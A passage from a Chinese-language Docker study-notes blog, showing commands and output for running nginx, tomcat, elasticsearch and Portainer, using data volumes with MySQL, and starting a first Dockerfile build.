Up 40 seconds       0.0.0.0:82-&gt;80/tcp   nginx00</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">5. 进入容器</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker exec -it nginx01 /bin/bash #进入</span><br><span class="line">root@aa664b0c8ed9:/# whereis nginx#找到nginx位置</span><br><span class="line">nginx: /usr/sbin/nginx /usr/lib/nginx /etc/nginx /usr/share/nginx</span><br><span class="line">root@aa664b0c8ed9:/# cd /etc/nginx/</span><br><span class="line">root@aa664b0c8ed9:/etc/nginx# ls</span><br><span class="line">conf.dfastcgi_paramskoi-utf  koi-win  mime.types  modules  nginx.conf  scgi_paramsuwsgi_params  win-utf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">6. 退出容器</span></span><br><span class="line">root@aa664b0c8ed9:/etc/nginx# exit</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">7. 停止容器</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES</span><br><span class="line">aa664b0c8ed9        nginx               "nginx -g 'daemon of…"   10 minutes ago      Up 10 minutes       0.0.0.0:3344-&gt;80/tcp   nginx01</span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]# docker stop aa664b0c8ed9</span><br></pre></td></tr></table></figure><h3 id="9-2-用docker-来装一个tomcat"><a href="#9-2-用docker-来装一个tomcat" class="headerlink" title="9.2  用docker 来装一个tomcat"></a>9.2  用docker 来装一个tomcat</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载 tomcat9.0</span></span><br><span class="line"><span class="comment"># 之前的启动都是后台，停止了容器，容器还是可以查到， docker run -it --rm 镜像名 一般是用来测试，用完就删除</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]<span class="comment"># docker run -it --rm tomcat:9.0</span></span><br><span class="line"></span><br><span class="line">--rm       Automatically remove the container when it exits 用完即删</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载 最新版</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]<span class="comment"># docker pull tomcat</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看下载的镜像</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]<span class="comment"># docker images</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#以后台方式，暴露端口方式，启动运行</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]<span class="comment"># docker run -d -p 8080:8080 --name tomcat01 tomcat</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#测试访问有没有问题</span></span><br><span class="line">curl localhost:8080</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据容器id进入tomcat容器</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]<span class="comment"># docker exec -it 645596565d3f /bin/bash</span></span><br><span class="line">root@645596565d3f:/usr/<span class="built_in">local</span>/tomcat<span class="comment"># </span></span><br><span class="line"><span class="comment">#查看tomcat容器内部内容：</span></span><br><span class="line">root@645596565d3f:/usr/<span class="built_in">local</span>/tomcat<span class="comment"># ls -l</span></span><br><span class="line">total 152</span><br><span class="line">-rw-r--r-- 1 root root 18982 May  5 20:40 BUILDING.txt</span><br><span class="line">-rw-r--r-- 1 root root  5409 May  5 20:40 CONTRIBUTING.md</span><br><span class="line">-rw-r--r-- 1 root root 57092 May  5 20:40 LICENSE</span><br><span class="line">-rw-r--r-- 1 root root  2333 May  5 20:40 NOTICE</span><br><span class="line">-rw-r--r-- 1 root root  3255 May  5 20:40 README.md</span><br><span class="line">-rw-r--r-- 1 root root  6898 May  5 20:40 RELEASE-NOTES</span><br><span class="line">-rw-r--r-- 1 root root 16262 May  5 20:40 RUNNING.txt</span><br><span class="line">drwxr-xr-x 2 root root  4096 May 16 12:05 bin</span><br><span class="line">drwxr-xr-x 1 root root  4096 May 21 11:04 conf</span><br><span class="line">drwxr-xr-x 2 root root  4096 May 16 12:05 lib</span><br><span class="line">drwxrwxrwx 1 root root  4096 May 21 11:04 logs</span><br><span class="line">drwxr-xr-x 2 root root  4096 May 16 12:05 native-jni-lib</span><br><span class="line">drwxrwxrwx 2 root root  4096 May 16 12:05 temp</span><br><span class="line">drwxr-xr-x 2 root root  4096 May 16 12:05 webapps</span><br><span class="line">drwxr-xr-x 7 root root  4096 May  5 20:37 webapps.dist</span><br><span class="line">drwxrwxrwx 2 root root  4096 May  5 20:36 work</span><br><span class="line">root@645596565d3f:/usr/<span class="built_in">local</span>/tomcat<span class="comment"># </span></span><br><span class="line"><span class="comment">#进入webapps目录</span></span><br><span class="line">root@645596565d3f:/usr/<span class="built_in">local</span>/tomcat<span class="comment"># cd webapps</span></span><br><span class="line">root@645596565d3f:/usr/<span class="built_in">local</span>/tomcat/webapps<span class="comment"># ls</span></span><br><span class="line">root@645596565d3f:/usr/<span class="built_in">local</span>/tomcat/webapps<span class="comment"># </span></span><br><span class="line"><span class="comment"># 发现问题：1、linux命令少了。 2.webapps目录为空 </span></span><br><span class="line"><span class="comment"># 原因：阿里云镜像的原因，阿里云默认是最小的镜像，所以不必要的都剔除掉</span></span><br><span class="line"><span class="comment"># 保证最小可运行的环境！</span></span><br><span class="line"><span class="comment"># 解决方案：</span></span><br><span class="line"><span class="comment"># 将webapps.dist下的文件都拷贝到webapps下即可</span></span><br><span class="line">root@645596565d3f:/usr/<span class="built_in">local</span>/tomcat<span class="comment"># ls 找到webapps.dist</span></span><br><span class="line">BUILDING.txt LICENSE  README.md RUNNING.txt  conf  logs  temp     webapps.dist</span><br><span class="line">CONTRIBUTING.md  NOTICE   RELEASE-NOTES  bin   lib   native-jni-lib  webapps  work</span><br><span class="line"></span><br><span class="line">root@645596565d3f:/usr/<span class="built_in">local</span>/tomcat<span class="comment"># cd webapps.dist/ # 进入webapps.dist </span></span><br><span class="line">root@645596565d3f:/usr/<span class="built_in">local</span>/tomcat/webapps.dist<span class="comment"># ls # 查看内容</span></span><br><span class="line">ROOT  docs  examples  host-manager  manager</span><br><span class="line"></span><br><span class="line">root@645596565d3f:/usr/<span class="built_in">local</span>/tomcat/webapps.dist<span class="comment"># cd ..</span></span><br><span class="line">root@645596565d3f:/usr/<span class="built_in">local</span>/tomcat<span class="comment"># cp -r webapps.dist/* webapps # 拷贝webapps.dist 内容给webapps</span></span><br><span class="line">root@645596565d3f:/usr/<span class="built_in">local</span>/tomcat<span class="comment"># cd webapps #进入webapps</span></span><br><span class="line">root@645596565d3f:/usr/<span class="built_in">local</span>/tomcat/webapps<span class="comment"># ls #查看拷贝结果</span></span><br><span class="line">ROOT  docs  examples  host-manager  manager</span><br></pre></td></tr></table></figure><h3 id="9-3-部署elasticsearch-kibana"><a href="#9-3-部署elasticsearch-kibana" class="headerlink" title="9.3 部署elasticsearch+kibana"></a>9.3 部署elasticsearch+kibana</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># es 暴露的端口很多！</span></span><br><span class="line"><span class="comment"># es 十分耗内存</span></span><br><span class="line"><span class="comment"># es 的数据一般需要放置到安全目录！挂载</span></span><br><span class="line"><span class="comment"># --net somenetwork ? 网络配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动elasticsearch</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]<span class="comment"># docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" elasticsearch:7.6.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试一下es是否成功启动</span></span><br><span class="line">➜  ~ curl localhost:9200</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"name"</span> : <span class="string">"d73ad2f22dd3"</span>,</span><br><span class="line">  <span class="string">"cluster_name"</span> : <span class="string">"docker-cluster"</span>,</span><br><span class="line">  <span class="string">"cluster_uuid"</span> : <span class="string">"atFKgANxS8CzgIyCB8PGxA"</span>,</span><br><span class="line">  <span class="string">"version"</span> : &#123;</span><br><span class="line">    <span class="string">"number"</span> : <span class="string">"7.6.2"</span>,</span><br><span class="line">    <span class="string">"build_flavor"</span> : <span class="string">"default"</span>,</span><br><span class="line">    <span class="string">"build_type"</span> : <span class="string">"docker"</span>,</span><br><span class="line">    <span class="string">"build_hash"</span> : <span class="string">"ef48eb35cf30adf4db14086e8aabd07ef6fb113f"</span>,</span><br><span class="line">    <span class="string">"build_date"</span> : <span class="string">"2020-03-26T06:34:37.794943Z"</span>,</span><br><span class="line">    <span class="string">"build_snapshot"</span> : <span class="literal">false</span>,</span><br><span class="line">    <span class="string">"lucene_version"</span> : <span class="string">"8.4.0"</span>,</span><br><span class="line">    <span class="string">"minimum_wire_compatibility_version"</span> : <span class="string">"6.8.0"</span>,</span><br><span class="line">    <span class="string">"minimum_index_compatibility_version"</span> : <span class="string">"6.0.0-beta1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"tagline"</span> : <span class="string">"You Know, for Search"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试成功就关掉elasticSearch，防止耗内存</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]<span class="comment"># docker stop d834ce2bd306</span></span><br><span class="line">d834ce2bd306</span><br><span class="line"></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]<span class="comment"># docker stats  # 查看docker容器使用内存情况</span></span><br></pre></td></tr></table></figure><p>==内存限制==</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#测试成功就关掉elasticSearch，可以添加内存的限制，修改配置文件 -e 环境配置修改</span></span><br><span class="line">➜  ~ docker rm -f d73ad2f22dd3            <span class="comment"># stop命令也行                               </span></span><br><span class="line">➜  ~ docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e <span class="string">"discovery.type=single-node"</span> -e ES_JAVA_OPTS=<span class="string">"-Xms64m -Xmx512m"</span> elasticsearch:7.6.2</span><br></pre></td></tr></table></figure><h1 id="十-Portainer-可视化面板安装"><a href="#十-Portainer-可视化面板安装" class="headerlink" title="十. Portainer 可视化面板安装"></a>十. Portainer 可视化面板安装</h1><p>portainer(先用这个)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:9000 \</span><br><span class="line">--restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span><br></pre></td></tr></table></figure><p>Rancher(CI/CD再用)<br>什么是portainer？<br>Docker图形化界面管理工具！提供一个后台面板供我们操作！</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装命令</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z ~]<span class="comment"># docker run -d -p 8080:9000 \</span></span><br><span class="line"> --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=<span class="literal">true</span> \ portainer/portainer</span><br><span class="line"></span><br><span class="line">Unable to find image <span class="string">'portainer/portainer:latest'</span> locally</span><br><span class="line">latest: Pulling from portainer/portainer</span><br><span class="line">d1e017099d17: Pull complete </span><br><span class="line">a7dca5b5a9e8: Pull complete </span><br><span class="line">Digest: sha256:4ae7f14330b56ffc8728e63d355bc4bc7381417fa45ba0597e5dd32682901080</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> portainer/portainer:latest</span><br><span class="line">81753869c4fd438cec0e31659cbed0d112ad22bbcfcb9605483b126ee8ff306d</span><br></pre></td></tr></table></figure><h1 id="十一-狂神Docker视频学习笔记-进阶篇"><a href="#十一-狂神Docker视频学习笔记-进阶篇" class="headerlink" title="十一. 狂神Docker视频学习笔记(进阶篇)"></a>十一. 狂神Docker视频学习笔记(进阶篇)</h1><h2 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h2><h4 id="什么是容器数据卷"><a href="#什么是容器数据卷" class="headerlink" title="什么是容器数据卷"></a>什么是容器数据卷</h4><p>将应用和环境打包成一个镜像！</p><p>数据？如果数据都在容器中，那么我们容器删除，数据就会丢失！需求：<strong>数据可以持久化</strong></p><p>MySQL，容器删除了，删库跑路！需求：<strong>MySQL数据可以存储在本地！</strong></p><p>容器之间可以有一个数据共享的技术！Docker容器中产生的数据，同步到本地！</p><p>这就是卷技术！目录的挂载，将我们容器内的目录，挂载到Linux上面！</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjEwNTI1ODQ1Ni5wbmc?x-oss-process=image/format,png" alt="img"></p><p><strong>总结一句话：容器的持久化和同步操作！容器间也是可以数据共享的！</strong></p><h4 id="使用数据卷"><a href="#使用数据卷" class="headerlink" title="使用数据卷"></a>使用数据卷</h4><blockquote><p>方式一 ：直接使用命令挂载 -v</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-v, --volume list                    Bind mount a volume</span><br><span class="line"></span><br><span class="line">docker run -it -v 主机目录:容器内目录  -p 主机端口:容器内端口</span><br><span class="line"><span class="meta">#</span><span class="bash"> /home/ceshi：主机home目录下的ceshi文件夹  映射：centos容器中的/home</span></span><br><span class="line">[root@iz2zeak7 home]# docker run -it -v /home/ceshi:/home centos /bin/bash</span><br><span class="line"><span class="meta">#</span><span class="bash">这时候主机的/home/ceshi文件夹就和容器的/home文件夹关联了,二者可以实现文件或数据同步了</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">通过 docker inspect 容器id 查看</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z home]# docker inspect 6064c490c371</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNTE5MTY0Nzk3MC5wbmc?x-oss-process=image/format,png" alt="img"></p><p>测试文件的同步</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNTE5MTcxODQ3MC5wbmc?x-oss-process=image/format,png" alt="img"></p><p>再来测试！</p><p>1、停止容器</p><p>2、宿主机修改文件</p><p>3、启动容器</p><p>4、容器内的数据依旧是同步的</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjExMDg1MDQzMS5wbmc?x-oss-process=image/format,png" alt="img"></p><p>好处：我们以后修改只需要在本地修改即可，容器内会自动同步！</p><h2 id="实战：安装MySQL"><a href="#实战：安装MySQL" class="headerlink" title="实战：安装MySQL"></a>实战：安装MySQL</h2><p><strong>思考：MySQL的数据持久化的问题</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 获取mysql镜像</span></span><br><span class="line">[root@iz2zeak7sgj6i7hrb2g862z home]# docker pull mysql:5.7</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行容器,需要做数据挂载 <span class="comment">#安装启动mysql，需要配置密码的，这是要注意点！</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 参考官网hub </span></span><br><span class="line">docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">启动我们得</span></span><br><span class="line">-d 后台运行</span><br><span class="line">-p 端口映射</span><br><span class="line">-v 卷挂载</span><br><span class="line">-e 环境配置</span><br><span class="line">-- name 容器名字</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql03 mysql:5.7</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动成功之后，我们在本地使用sqlyog来测试一下</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sqlyog-连接到服务器的3306--和容器内的3306映射 </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 在本地测试创建一个数据库，查看一下我们映射的路径是否ok！</span></span><br></pre></td></tr></table></figure><p><strong>测试连接</strong>：注意3310端口要在阿里云服务器的安全组中打开，否则无法连接。</p><p><img src="https://img-blog.csdnimg.cn/20200524154329225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU5MTk4MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>当我们在本地用SQLyog新建名称为test的数据库时候，容器容器也会创建</p><p><img src="https://img-blog.csdnimg.cn/20200524154352820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU5MTk4MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>假设我们将包含mysql的容器删除时，</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjExMjUzMjk1MC5wbmc?x-oss-process=image/format,png" alt="img"></p><p>发现，<strong>我们挂载到本地的数据卷依旧没有丢失，这就实现了容器数据持久化功能</strong>。</p><h2 id="具名和匿名挂载"><a href="#具名和匿名挂载" class="headerlink" title="具名和匿名挂载"></a>具名和匿名挂载</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 匿名挂载</span></span><br><span class="line">-v 容器内路径!</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -P --name nginx01 -v /etc/nginx nginx</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看所有的volume(卷)的情况</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker volume ls    </span></span><br><span class="line">DRIVER              VOLUME NAME # 容器内的卷名(匿名卷挂载)</span><br><span class="line">local               21159a8518abd468728cdbe8594a75b204a10c26be6c36090cde1ee88965f0d0</span><br><span class="line">local               b17f52d38f528893dd5720899f555caf22b31bf50b0680e7c6d5431dbda2802c</span><br><span class="line">         </span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里发现，这种就是匿名挂载，我们在 -v只写了容器内的路径，没有写容器外的路径！</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 具名挂载 -P:表示随机映射端口</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -P --name nginx02 -v juming-nginx:/etc/nginx nginx</span></span><br><span class="line">9663cfcb1e5a9a1548867481bfddab9fd7824a6dc4c778bf438a040fe891f0ee</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看所有的volume(卷)的情况</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker volume ls                  </span></span><br><span class="line">DRIVER              VOLUME NAME</span><br><span class="line">local               21159a8518abd468728cdbe8594a75b204a10c26be6c36090cde1ee88965f0d0</span><br><span class="line">local               b17f52d38f528893dd5720899f555caf22b31bf50b0680e7c6d5431dbda2802c</span><br><span class="line">local               juming-nginx #多了一个名字</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过 -v 卷名：查看容器内路径</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看一下这个卷</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker volume inspect juming-nginx</span></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        "CreatedAt": "2020-05-23T13:55:34+08:00",</span><br><span class="line">        "Driver": "local",</span><br><span class="line">        "Labels": null,</span><br><span class="line">        "Mountpoint": "/var/lib/docker/volumes/juming-nginx/_data", #默认目录</span><br><span class="line">        "Name": "juming-nginx",</span><br><span class="line">        "Options": null,</span><br><span class="line">        "Scope": "local"</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjExMzU0NTc0Ni5wbmc?x-oss-process=image/format,png" alt="img"></p><p>所有的docker容器内的卷，没有指定目录的情况下都是在<strong>/var/lib/docker/volumes/自定义的卷名/_data</strong>下， <strong>如果指定了目录，docker volume ls 是查看不到的</strong>。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoZW5nY29kZXgvY2xvdWRpbWcvbWFzdGVyL2ltZy9pbWFnZS0yMDIwMDUxNjExNDIzMTQzNS5wbmc?x-oss-process=image/format,png" alt="img"></p><p><strong>区分三种挂载方式</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 三种挂载： 匿名挂载、具名挂载、指定路径挂载</span></span><br><span class="line">-v 容器内路径#匿名挂载</span><br><span class="line">-v 卷名：容器内路径  #具名挂载</span><br><span class="line">-v /宿主机路径：容器内路径 #指定路径挂载 docker volume ls 是查看不到的</span><br></pre></td></tr></table></figure><p>拓展：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 通过 -v 容器内路径： ro rw 改变读写权限</span></span><br><span class="line">ro #readonly 只读</span><br><span class="line">rw #readwrite 可读可写</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -P --name nginx05 -v juming:/etc/nginx:ro nginx</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> docker run -d -P --name nginx05 -v juming:/etc/nginx:rw nginx</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ro 只要看到ro就说明这个路径只能通过宿主机来操作，容器内部是无法操作！</span></span><br></pre></td></tr></table></figure><h2 id="初始Dockerfile"><a href="#初始Dockerfile" class="headerlink" title="初始Dockerfile"></a>初始Dockerfile</h2><p><strong>Dockerfile 就是用来构建docker镜像的构建文件</strong>！命令脚本！先体验一下！</p><p>通过这个<strong>脚本可以生成镜像</strong>，镜像是一层一层的，脚本是一个个的命令，每个命令都是一层！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建一个dockerfile文件，名字可以随便 建议Dockerfile</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件中的内容： 指令(大写) + 参数</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vim dockerfile1</span></span><br><span class="line">    FROM centos # 当前这个镜像是以centos为基础的</span><br><span class="line"></span><br><span class="line">    VOLUME ["volume01","volume02"] # 挂载卷的卷目录列表(多个目录)</span><br><span class="line"></span><br><span class="line">    CMD echo "-----end-----"# 输出一下用于测试</span><br><span class="line">    CMD /bin/bash# 默认走bash控制台</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里的每个命令，就是镜像的一层！</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 构建出这个镜像 </span></span><br><span class="line">-f dockerfile1 # f代表file，指这个当前文件的地址(这里是当前目录下的dockerfile1)</span><br><span class="line">-t caoshipeng/centos # t就代表target，指目标目录(注意caoshipeng镜像名前不能加斜杠‘/’)</span><br><span class="line">. # 表示生成在当前目录下</span><br><span class="line"><span class="meta">$</span><span class="bash"> docker build -f dockerfile1 -t caoshipeng/centos .</span></span><br><span class="line">Sending build context to Docker daemon   2.56kB</span><br><span class="line">Step 1/4 : FROM centos</span><br><span class="line">latest: Pulling from library/centos</span><br><span 